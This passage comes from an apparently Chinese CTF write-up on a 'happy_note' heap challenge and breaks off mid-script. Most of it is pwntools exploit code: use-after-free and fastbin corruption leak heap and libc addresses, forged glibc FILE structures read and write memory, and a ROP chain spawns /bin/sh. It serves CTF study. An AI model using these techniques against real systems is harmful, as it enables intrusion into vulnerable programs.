class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_template</span>(<span class="params">buf, nbytes, next_fp</span>):</span></span><br><span class="line">    <span class="comment"># read(fp-&gt;_fileno, fp-&gt;_IO_write_base, fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base)</span></span><br><span class="line">    payload = flat(&#123;</span><br><span class="line">        <span class="number">0x10</span>: buf,                                      <span class="comment"># _IO_read_end   =&gt; in new_do_write,</span></span><br><span class="line">                                                        <span class="comment">#                   bypass fp-&gt;_IO_read_end != fp-&gt;_IO_write_base</span></span><br><span class="line">        <span class="number">0x20</span>: buf,                                      <span class="comment"># _IO_write_base =&gt; read buf</span></span><br><span class="line">        <span class="number">0x28</span>: buf + nbytes,                             <span class="comment"># _IO_write_ptr  =&gt; read nbytes</span></span><br><span class="line">                                                        <span class="comment">#                   in _IO_flush_all_lockp,</span></span><br><span class="line">                                                        <span class="comment">#                   fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line">        <span class="number">0x68</span>: next_fp,                                  <span class="comment"># _chain</span></span><br><span class="line">        <span class="number">0x70</span>: <span class="number">0</span>,                                        <span class="comment"># _fileno        =&gt; read fd, stdin</span></span><br><span class="line">        <span class="number">0xc0</span>: <span class="number">0</span>,                                        <span class="comment"># _mode          =&gt; in _IO_flush_all_lockp,</span></span><br><span class="line">                                                        <span class="comment">#                   fp-&gt;_mode &lt;= 0</span></span><br><span class="line">        <span class="number">0xd8</span>: libc_IO_file_jumps - <span class="number">0x8</span>,                 <span class="comment"># vtable         =&gt; _IO_OVERFLOW -&gt; _IO_new_file_finish</span></span><br><span class="line">                                                        <span class="comment">#                =&gt; House of Illusion</span></span><br><span class="line">    &#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_template</span>(<span class="params">buf, nbytes, next_fp</span>):</span></span><br><span class="line">    <span class="comment"># write(fp-&gt;_fileno, fp-&gt;_IO_write_base, fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base)</span></span><br><span class="line">    payload = flat(&#123;</span><br><span class="line">        <span class="number">0x00</span>: <span class="number">0x800</span>,                                    <span class="comment"># _flags         =&gt; _IO_CURRENTLY_PUTTING</span></span><br><span class="line">                                                        <span class="comment">#                   in _IO_new_file_overflow,</span></span><br><span class="line">                                                        <span class="comment">#                   bypass (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0</span></span><br><span class="line">        <span class="number">0x10</span>: buf,                                      <span class="comment"># _IO_read_end   =&gt; in new_do_write,</span></span><br><span class="line">                                                        <span class="comment">#                   bypass fp-&gt;_IO_read_end != fp-&gt;_IO_write_base</span></span><br><span class="line">        <span class="number">0x20</span>: buf,                                      <span class="comment"># _IO_write_base =&gt; read buf</span></span><br><span class="line">        <span class="number">0x28</span>: buf + nbytes,                             <span class="comment"># _IO_write_ptr  =&gt; read nbytes</span></span><br><span class="line">                                                        <span class="comment">#                   in _IO_flush_all_lockp,</span></span><br><span class="line">                                                        <span class="comment">#                   fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line">        <span class="number">0x68</span>: next_fp,                                  <span class="comment"># _chain</span></span><br><span class="line">        <span class="number">0x70</span>: <span class="number">1</span>,                                        <span class="comment"># _fileno        =&gt; read fd, stdin</span></span><br><span class="line">        <span class="number">0xc0</span>: <span class="number">0</span>,                                        <span class="comment"># _mode          =&gt; in _IO_flush_all_lockp,</span></span><br><span class="line">                                                        <span class="comment">#                   fp-&gt;_mode &lt;= 0</span></span><br><span class="line">        <span class="number">0xd8</span>: libc_IO_file_jumps,                       <span class="comment"># vtable         =&gt; _IO_OVERFLOW -&gt; _IO_new_file_overflow</span></span><br><span class="line">    &#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">read_length = <span class="built_in">len</span>(read_template(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">write_length = <span class="built_in">len</span>(write_template(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line"><span class="keyword">assert</span> read_length == write_length</span><br><span class="line">fp_length = read_length</span><br><span class="line"></span><br><span class="line">controled_addr = libc_iolist + <span class="number">0x10</span></span><br><span class="line">fp_addr = [controled_addr + fp_length * i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    <span class="comment">#AUTOGDB and g.execute(&#x27;b _IO_flush_all_lockp&#x27;) and sleep(T)</span></span><br><span class="line">    <span class="comment">#AUTOGDB and g.execute(&#x27;b genops.c:701&#x27;) and sleep(T)</span></span><br><span class="line">    AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;b _IO_new_file_finish&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">iolist-0x10: 0              0</span></span><br><span class="line"><span class="string">iolist     : controled_addr 0</span></span><br><span class="line"><span class="string">iolist+0x10: fp0            ...</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">fp0 = read_template(fp_addr[<span class="number">1</span>], fp_length * <span class="number">2</span>, fp_addr[<span class="number">1</span>]) <span class="comment"># todo: read fp1 and fp2</span></span><br><span class="line">edit(<span class="number">1</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(fp_addr[<span class="number">0</span>]) + p64(<span class="number">0</span>) + fp0)</span><br><span class="line">controled_addr += fp_length * <span class="number">2</span></span><br><span class="line">delete(<span class="number">3</span>)   <span class="comment"># exit</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;b _IO_new_file_overflow&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;It&#x27;s empty!\n&quot;</span>)</span><br><span class="line">fp1 = write_template(libc_environ, <span class="number">8</span>, fp_addr[<span class="number">2</span>])</span><br><span class="line">fp2 = read_template(fp_addr[<span class="number">3</span>], fp_length * <span class="number">2</span>, fp_addr[<span class="number">3</span>]) <span class="comment"># todo: read fp3 and fp4</span></span><br><span class="line">r.send(fp1 + fp2)</span><br><span class="line">stack_environ = u64(r.recv())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">hex</span>(stack_environ) = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">00:0000│ rsp 0x7ffc5d62b248 —▸ 0x7f9e76c894ff (_IO_cleanup+15) ◂— mov ebx, eax</span></span><br><span class="line"><span class="string">01:0008│     0x7ffc5d62b250 —▸ 0x7f9e76dea6e8 (__elf_set___libc_atexit_element__IO_cleanup__) —▸ 0x7f9e76c894f0 (_IO_cleanup) ◂— endbr64</span></span><br><span class="line"><span class="string">02:0010│     0x7ffc5d62b258 —▸ 0x7f9e76c496f7 (__run_exit_handlers+563) ◂— add rbx, 8</span></span><br><span class="line"><span class="string"><span class="meta">... </span>...</span></span><br><span class="line"><span class="string">34:01a0│     0x7ffc5d62b3e8 —▸ 0x7ffc5d62cfd9 ◂— &#x27;LD_LIBRARY_PATH=.&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># find ret address of _IO_flush_all_lockp to flush_cleanup (brute force)</span></span><br><span class="line">bf_count = <span class="number">0x400</span></span><br><span class="line"><span class="keyword">assert</span> bf_count % <span class="number">8</span> == <span class="number">0</span></span><br><span class="line">fp3 = write_template(stack_environ - bf_count, bf_count, fp_addr[<span class="number">4</span>])</span><br><span class="line">fp4 = read_template(fp_addr[<span class="number">5</span>], fp_length, fp_addr[<span class="number">5</span>]) <span class="comment"># todo: read fp5</span></span><br><span class="line">r.send(fp3 + fp4)</span><br><span class="line">stack_data = r.recv()</span><br><span class="line">stack_data = [u64(stack_data[i*<span class="number">8</span>: (i+<span class="number">1</span>)*<span class="number">8</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bf_count // <span class="number">8</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    ret_fun = libc_IO_cleanup = libc.symbols[<span class="string">&#x27;_IO_cleanup&#x27;</span>] + <span class="number">15</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ret_fun = libc_base + <span class="number">0x8ebfe</span>	<span class="comment"># from gdb</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(stack_data)):</span><br><span class="line">    sdi = stack_data[i]</span><br><span class="line">    <span class="keyword">if</span> sdi == ret_fun:</span><br><span class="line">        rop_addr = stack_environ - bf_count + i * <span class="number">8</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;rop_addr not found&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">hex</span>(rop_addr) = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    libc_ret = libc_base + <span class="number">0x2c704</span></span><br><span class="line">    libc_pop_rdi = libc_base + <span class="number">0x2c7f9</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc_pop_rdi = libc_base + <span class="number">0x2a3e5</span></span><br><span class="line">    libc_ret = libc_base + <span class="number">0x29cd6</span></span><br><span class="line">libc_system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">libc_sh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">rop = flat([</span><br><span class="line">    libc_ret,   <span class="comment"># align to 16 bytes</span></span><br><span class="line">    libc_pop_rdi, libc_sh,</span><br><span class="line">    libc_system</span><br><span class="line">], filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">fp5 = read_template(rop_addr, <span class="built_in">len</span>(rop), <span class="number">0</span>) <span class="comment"># todo: read rop and return</span></span><br><span class="line">r.send(fp5)</span><br><span class="line"></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">f&#x27;b *<span class="subst">&#123;libc_ret&#125;</span>&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">r.send(rop)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
<h2 id="House-of-Some-2">House of Some 2<a class="anchor" href="#House-of-Some-2">·</a></h2>
<p>题目有<code>puts</code>函数，所以也可以用<code>House of Some 2</code>来打</p>
<p>直接用<a href="https://tover.xyz/p/PWN-Note-4-House-of-Some-2/#%E5%8F%82%E8%80%83Exp">笔记vol.4</a>的代码改一下就好</p>
<p>调的时候发现<code>libc6_2.35-0ubuntu3_amd64.so</code>没有<code>_IO_wfile_jumps_maybe_mmap</code>和<code>_IO_str_jumps</code>的符号，就不能直接通过<code>libc.symbols</code>去找</p>
<p>解决方法可以是打开<code>ida</code>（或者<code>gdb</code>应该也行？）找<code>__libc_IO_vtables</code>，虽然<code>ida</code>中也没有符号，但是我发现这些表放的顺序和我自己编的调试库是一样的，这里给一个我调试库的顺序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>: _IO_helper_jumps</span><br><span class="line"><span class="number">01</span>: _IO_helper_jumps_0</span><br><span class="line"><span class="number">02</span>: _IO_cookie_jumps</span><br><span class="line"><span class="number">03</span>: _IO_proc_jumps</span><br><span class="line"><span class="number">04</span>: _IO_str_chk_jumps</span><br><span class="line"><span class="number">05</span>: _IO_wstrn_jumps</span><br><span class="line"><span class="number">06</span>: _IO_wstr_jumps</span><br><span class="line"><span class="number">07</span>: _IO_wfile_jumps_maybe_mmap	&lt;=</span><br><span class="line"><span class="number">08</span>: _IO_wfile_jumps_mmap</span><br><span class="line"><span class="number">09</span>: __GI__IO_wfile_jumps</span><br><span class="line"><span class="number">10</span>: _IO_wmem_jumps</span><br><span class="line"><span class="number">11</span>: _IO_mem_jumps</span><br><span class="line"><span class="number">12</span>: _IO_strn_jumps</span><br><span class="line"><span class="number">13</span>: _IO_obstack_jumps</span><br><span class="line"><span class="number">14</span>: _IO_file_jumps_maybe_mmap</span><br><span class="line"><span class="number">15</span>: _IO_file_jumps_mmap</span><br><span class="line"><span class="number">16</span>: __GI__IO_file_jumps</span><br><span class="line"><span class="number">17</span>: _IO_str_jumps				&lt;=</span><br></pre></td></tr></table></figure>
<p>于是按住顺序去找就好了</p>
<p>PS：@CSOME 的代码里面好像有个自动化找的，可以看看</p>
<p>参考代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span>  <span class="comment"># for flat</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">T = <span class="number">0.1</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="literal">False</span></span><br><span class="line">AUTOGDB = <span class="literal">True</span></span><br><span class="line">DEBUG = <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    env = &#123;<span class="string">&#x27;LD_LIBRARY_PATH&#x27;</span>: <span class="string">&#x27;.&#x27;</span>&#125;</span><br><span class="line">    r = process(<span class="string">&#x27;./happy_note&#x27;</span>, env=env)</span><br><span class="line">    <span class="keyword">if</span> AUTOGDB:</span><br><span class="line">        gid, g = gdb.attach(r, api=<span class="literal">True</span>, gdbscript=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;dir ./src&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">        AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;c&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(r, gdbscript=<span class="string">&#x27;dir ./src&#x27;</span>)</span><br><span class="line">        <span class="built_in">input</span>(<span class="string">&#x27;Waiting GDB...&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    AUTOGDB = <span class="literal">False</span></span><br><span class="line">    r = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28681</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, size, mode=<span class="number">1</span></span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Note size:&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choose a note:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choose a mode: [1] or [2]&#x27;</span>, <span class="built_in">str</span>(mode).encode())</span><br><span class="line">    sleep(T)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choose a note:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sleep(T)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Which one do you want to show?&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> r.recvline()[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choose a note:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&#x27;Edit your content:&#x27;</span>, content)</span><br><span class="line">    sleep(T)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uaf</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;666&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choose a note:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sleep(T)</span><br><span class="line"></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;p &quot;fastbin attack and uaf&quot;&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x78</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">uaf(<span class="number">11</span>)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;bins&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;p &quot;leak heap_base&quot;&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">heap_base = u64(show(<span class="number">11</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">hex</span>(heap_base) = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PROTECT_PTR</span>(<span class="params">ptr, pos</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (pos &gt;&gt; <span class="number">12</span>) ^ ptr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;p &quot;leak libc_base&quot;&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i, <span class="number">0x200</span>)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;x/12gx $rebase(0x40a0)&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;set $chunk5=*(size_t*)$rebase(0x40c8)-0x10&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;set $chunk4=*(size_t*)$rebase(0x40c0)-0x10&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">edit(<span class="number">5</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x190</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>))   <span class="comment"># chunk 6 =&gt; unsortedbin</span></span><br><span class="line">                                                <span class="comment"># fakechunk =&gt; heap_base + 0x1280</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x190</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>))   <span class="comment"># todo: rewrite chunk5 =&gt; heap_base + 0x1070</span></span><br><span class="line">delete(<span class="number">7</span>)   <span class="comment"># split top_chunk</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;hexdump $chunk5 0x500&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">11</span>, p64(PROTECT_PTR(heap_base + <span class="number">0x1280</span>, heap_base)))</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x78</span>)   <span class="comment"># chunk10 == chunk11 (pointer)</span></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;bins&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x78</span>)    <span class="comment"># fake_chunk</span></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;x/12gx $rebase(0x40a0)&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;bins&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">9</span>, <span class="string">b&#x27;9&#x27;</span> * <span class="number">0x78</span>)    <span class="comment"># calloc =&gt; &#x27;9&#x27; * 0x78 + chunk6-&gt;bk</span></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;hexdump $chunk5 0x500&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    libc_base = u64(show(<span class="number">9</span>)[<span class="number">0x78</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1e0ce0</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;libc-2.35-debug.so&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc_base = u64(show(<span class="number">9</span>)[<span class="number">0x78</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1e0ce0</span> - <span class="number">0x39000</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;libc6_2.35-0ubuntu3_amd64.so&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">hex</span>(libc_base) = &#125;</span>&#x27;</span>)</span><br><span class="line">libc.address = libc_base</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;p &quot;hijack stdout&quot;&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">edit(<span class="number">11</span>, p64(PROTECT_PTR(heap_base + <span class="number">0x1070</span>, heap_base)))</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;bins&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;x/12gx $rebase(0x40a0)&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span 